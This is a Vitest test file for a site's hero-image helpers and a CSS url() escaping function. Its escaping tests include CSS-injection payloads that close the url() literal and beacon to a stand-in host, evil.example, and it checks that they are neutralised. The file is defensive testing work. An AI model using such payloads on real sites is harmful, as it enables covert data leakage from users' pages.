import { describe, test, expect } from 'vitest'
import { cssUrl, hashString, pickHeroImage, heroBackground } from './media'

describe('pickHeroImage', () => {
  const pool = ['a.jpg', 'b.jpg', 'c.jpg']

  test('a pinned photo always wins', () => {
    expect(pickHeroImage({ pinnedUrl: 'pinned.jpg', pool, seed: 'fix-1' })).toBe('pinned.jpg')
  })

  test('falls back to null when there is no pool and nothing pinned', () => {
    expect(pickHeroImage({ pool: [], seed: 'fix-1' })).toBeNull()
    expect(pickHeroImage({})).toBeNull()
  })

  test('is stable for the same fixture seed (no flicker)', () => {
    const a = pickHeroImage({ pool, seed: 'fix-42' })
    const b = pickHeroImage({ pool, seed: 'fix-42' })
    expect(a).toBe(b)
    expect(pool).toContain(a)
  })

  test('different fixtures can get different photos', () => {
    const picks = new Set(['s1', 's2', 's3', 's4', 's5'].map((s) => pickHeroImage({ pool, seed: s })))
    expect(picks.size).toBeGreaterThan(1)
  })

  test('hashString is deterministic and non-negative', () => {
    expect(hashString('abc')).toBe(hashString('abc'))
    expect(hashString('abc')).toBeGreaterThanOrEqual(0)
  })
})

describe('heroBackground', () => {
  test('uses the photo (under the wash) when one is available', () => {
    const bg = heroBackground({ pinnedUrl: 'p.jpg', gradient: 'var(--grad-xl)' })
    expect(bg).toBe('var(--hero-wash), url("p.jpg")')
  })
  test('falls back to the team gradient (under the wash) with no photo', () => {
    expect(heroBackground({ pool: [], seed: 'x', gradient: 'var(--grad-community)' }))
      .toBe('var(--hero-wash), var(--grad-community)')
  })
})

// The URL is an admin-typed database column dropped straight into a CSS
// url("…") literal. A bare `")` in it closes the literal and everything after
// is read as further CSS declarations — so escape before it gets there. The DB
// constraints (0035 F6 / 0037 D) and the CSP img-src rule are the other layers.
// Code points, not escape sequences: a literal backslash in a test file is
// the sort of character a shell or a patch tool quietly eats, and the test
// would then assert nothing.
const BS = String.fromCharCode(92)
const LF = String.fromCharCode(10)

describe('cssUrl — no breaking out of the url() literal', () => {
  test('leaves an ordinary storage URL untouched', () => {
    const u = 'https://abc.supabase.co/storage/v1/object/public/media/photos/a-b.jpg'
    expect(cssUrl(u)).toBe(u)
  })

  test('neutralises a quote-and-close payload', () => {
    const out = cssUrl('x.jpg"); background: url(https://evil.example/beacon?c=')
    expect(out).not.toContain('"')
    expect(out).not.toContain(')')
    expect(out).not.toContain('(')
  })

  test('neutralises single quotes, backslashes and whitespace', () => {
    expect(cssUrl("a'b")).not.toContain("'")
    expect(cssUrl('a' + BS + 'b')).not.toContain(BS)
    expect(cssUrl('a b')).not.toContain(' ')
    expect(cssUrl('a' + LF + 'b')).not.toContain(LF)
  })

  test('null and undefined come back empty rather than as the string "null"', () => {
    expect(cssUrl(null)).toBe('')
    expect(cssUrl(undefined)).toBe('')
  })

  test('leaves the characters a real URL needs — colon, slash, question mark', () => {
    expect(cssUrl('https://a.supabase.co/x/y.jpg?v=2')).toBe('https://a.supabase.co/x/y.jpg?v=2')
  })

  test('heroBackground escapes the photo URL it embeds', () => {
    const bg = heroBackground({ pinnedUrl: 'p.jpg"); background: url(evil', gradient: 'g' })
    expect(bg).toBe('var(--hero-wash), url("p.jpg%22%29;%20background:%20url%28evil")')
  })
})
